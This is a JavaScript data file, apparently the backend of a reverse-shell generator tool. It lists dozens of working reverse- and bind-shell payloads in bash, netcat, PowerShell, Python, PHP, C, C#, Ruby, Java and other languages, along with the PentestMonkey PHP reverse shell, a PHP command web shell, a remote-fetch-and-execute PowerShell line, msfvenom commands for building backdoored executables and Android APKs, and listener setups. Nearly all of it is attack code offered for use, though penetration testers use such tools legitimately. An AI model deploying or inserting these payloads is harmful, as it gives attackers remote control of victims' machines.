const CommandType = {
    'ReverseShell': 'ReverseShell',
    'BindShell': 'BindShell',
    'MSFVenom': 'MSFVenom'
};

const withCommandType = function (commandType, elements) {
    return elements.map((element) => {
        return {
            ...element,
            meta: [
                ...element.meta,
                commandType
            ]
        }
    });
}

const reverseShellCommands = withCommandType(
    CommandType.ReverseShell,
    [
        {
            "name": "Bash -i",
            "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Bash 196",
            "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Bash read line",
            "command": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Bash 5",
            "command": "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Bash udp",
            "command": "{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
            "meta": ["linux", "mac"]
        },
        {
            "name": "nc mkfifo",
            "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
            "meta": ["linux", "mac"]
        },
        {
            "name": "nc -e",
            "command": "nc -e {shell} {ip} {port}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "nc.exe -e",
            "command": "nc -e {shell} {ip} {port}",
            "meta": ["windows"]
        },
        {
            "name": "nc -c",
            "command": "nc -c {shell} {ip} {port}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "ncat -e",
            "command": "ncat {ip} {port} -e {shell}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "ncat.exe -e",
            "command": "ncat.exe {ip} {port} -e {shell}",
            "meta": ["windows"]
        },
        {
            "name": "ncat udp",
            "command": "ncat {ip} {port} -e {shell}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "C",
            "command": "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"{shell}\", NULL};\n    execve(\"{shell}\", argv, NULL);\n\n    return 0;       \n}",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "C#",
            "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"{ip}\", {port}))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"cmd.exe\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}",
            "meta": ["linux", "windows"]
        },
        {
            "name": "Haskell #1",
            "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Perl",
            "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Perl no sh",
            "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP Emoji",
            "command": "php -r '$😀=\"1\";$😁=\"2\";$😅=\"3\";$😆=\"4\";$😉=\"5\";$😊=\"6\";$😎=\"7\";$😍=\"8\";$😚=\"9\";$🙂=\"0\";$🤢=\" \";$🤓=\"<\";$🤠=\">\";$😱=\"-\";$😵=\"&\";$🤩=\"i\";$🤔=\".\";$🤨=\"/\";$🥰=\"a\";$😐=\"b\";$😶=\"i\";$🙄=\"h\";$😂=\"c\";$🤣=\"d\";$😃=\"e\";$😄=\"f\";$😋=\"k\";$😘=\"n\";$😗=\"o\";$😙=\"p\";$🤗=\"s\";$😑=\"x\";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = \"{ip}\";$💻 = {port};$🐚 = \"{shell}\". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP PentestMonkey",
            "command": "<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '{ip}';\n$port = {port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; {shell} -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit(\"ERROR: Can't fork\");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit(\"Error: Can't setsid()\");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit(\"$errstr ($errno)\");\n\texit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(\"ERROR: Can't spawn shell\");\n\texit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit(\"ERROR: Shell connection terminated\");\n\t\tbreak;\n\t}\n\n\tif (feof($pipes[1])) {\n\t\tprintit(\"ERROR: Shell process terminated\");\n\t\tbreak;\n\t}\n\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(\"SOCK READ\");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(\"SOCK: $input\");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(\"STDOUT READ\");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(\"STDOUT: $input\");\n\t\tfwrite($sock, $input);\n\t}\n\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(\"STDERR READ\");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(\"STDERR: $input\");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint \"$string\\n\";\n\t}\n}\n\n?>",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP cmd",
            "command": "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER[\'PHP_SELF\']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n<\/form>\n<pre>\n<?php\n    if(isset($_GET[\'cmd\']))\n    {\n        system($_GET[\'cmd\']);\n    }\n?>\n<\/pre>\n<\/body>\n<script>document.getElementById(\"cmd\").focus();<\/script>\n<\/html>",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP exec",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", , "mac"]
        },
        {
            "name": "PHP shell_exec",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP system",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP passthru",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP `",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP popen",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} <&3 >&3 2>&3\", \"r\");'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "Windows ConPty",
            "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell #1",
            "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell #2",
            "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell #3",
            "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell #4 (TLS)",
            "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell #3 (Base64)",
            "meta": ["windows"]
        },
        {
            "name": "Python #1",
            "command": "export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Python #2",
            "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Python3 #1",
            "command": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Python3 #2",
            "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Ruby #1",
            "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Ruby no sh",
            "command": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "socat #1",
            "command": "socat TCP:{ip}:{port} EXEC:{shell}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "socat #2 (TTY)",
            "command": "socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
            "meta": ["linux", "mac"]
        },
        {
            "name": "node.js",
            "command": "require('child_process').exec('nc -e {shell} {ip} {port}')",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Java #1",
            "command": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class shell {\n    public static void main(String args[]) {\n        String s;\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "telnet",
            "command": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
            "meta": ["linux", "mac"]
        },
        {
            "name": "zsh",
            "command": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
            "meta": ["linux", "mac"]
        }
    ]
);

const bindShellCommands =  withCommandType(
    CommandType.BindShell,
    [
        {
            "name": "Python3 Bind",
            "command": "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
            "meta": ["bind", "mac", "linux", "windows"]
        },
        {
            "name": "PHP Bind",
            "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'",
            "meta": ["bind", "mac", "linux", "windows"]
        }
    ]
);

const msfvenomCommands =  withCommandType(
    CommandType.MSFVenom,
    [
        {
            "name": "Windows Meterpreter Staged Reverse TCP (x64)",
            "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
        },
        {
            "name": "Windows Meterpreter Stageless Reverse TCP (x64)",
            "command": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            "meta": ["msfvenom", "windows", "stageless", "reverse"]
        },
        {
            "name": "Windows Staged Reverse TCP (x64)",
            "command": "msfvenom -p windows/x64/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
        },
        {
            "name": "Windows Stageless Reverse TCP (x64)",
            "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            "meta": ["msfvenom", "windows", "stageless", "reverse"]
        },
        {
            "name": "Linux Meterpreter Staged Reverse TCP (x64)",
            "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
            "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
        },
        {
            "name": "Linux Stageless Reverse TCP (x64)",
            "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
            "meta": ["msfvenom", "linux", "meterpreter", "stageless", "reverse"]
        },
        {
            "name": "Windows Bind TCP ShellCode - BOF",
            "command": "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf -o shellcode",
            "meta": ["msfvenom", "windows", "bind", "bufferoverflow"]
        },
        {
            "name": "macOS Meterpreter Staged Reverse TCP (x64)",
            "command": "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
            "meta": ["msfvenom", "mac", "stageless", "reverse"]
        },
        {
            "name": "macOS Meterpreter Stageless Reverse TCP (x64)",
            "command": "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
            "meta": ["msfvenom", "mac", "stageless", "reverse"]
        },
        {
            "name": "macOS Stageless Reverse TCP (x64)",
            "command": "msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
            "meta": ["msfvenom", "mac", "stageless", "reverse"]
        },
        {
            "name": "PHP Meterpreter Stageless Reverse TCP",
            "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",
            "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
        },
        {
            "name": "PHP Reverse PHP",
            "command": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",
            "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
        },
        {
            "name": "JSP Stageless Reverse TCP",
            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",
            "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
        },
        {
            "name": "WAR Stageless Reverse TCP",
            "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
            "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
        },
        {
            "name": "Android Meterpreter Reverse TCP",
            "command": "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
            "meta": ["msfvenom", "android", "android", "reverse"]
        },
        {
            "name": "Android Meterpreter Embed Reverse TCP",
            "command": "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
            "meta": ["msfvenom", "android", "android", "reverse"]
        },
        {
            "name": "Python Stageless Reverse TCP",
            "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw -o shell.py",
            "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
        },
        {
            "name": "Bash Stageless Reverse TCP",
            "command": "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",
            "meta": ["msfvenom", "linux", "macos", "stageless", "reverse"]
        },
    ]
);

const rsgData = {

    listenerCommands: [
        ['nc', 'nc -lvnp {port}'],
        ['ncat', 'ncat -lvnp {port}'],
        ['ncat (TLS)', 'ncat --ssl -lvnp {port}'],
        ['rlwrap + nc', 'rlwrap -cAr nc -lvnp {port}'],
        ['pwncat', 'python3 -m pwncat -lp {port}'],
        ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
        ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
        ['powercat', 'powercat -l -p {port}'],
        ['msfconsole', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"']
    ],

    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],

    upgrade: ['python', ],

    specialCommands: {
        'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    },

    reverseShellCommands: [
        ...reverseShellCommands,
        ...bindShellCommands,
        ...msfvenomCommands
    ]
}

// Export the data for use within netlify functions / node
if (typeof exports !== 'undefined') {
    exports.rsgData = rsgData;
}
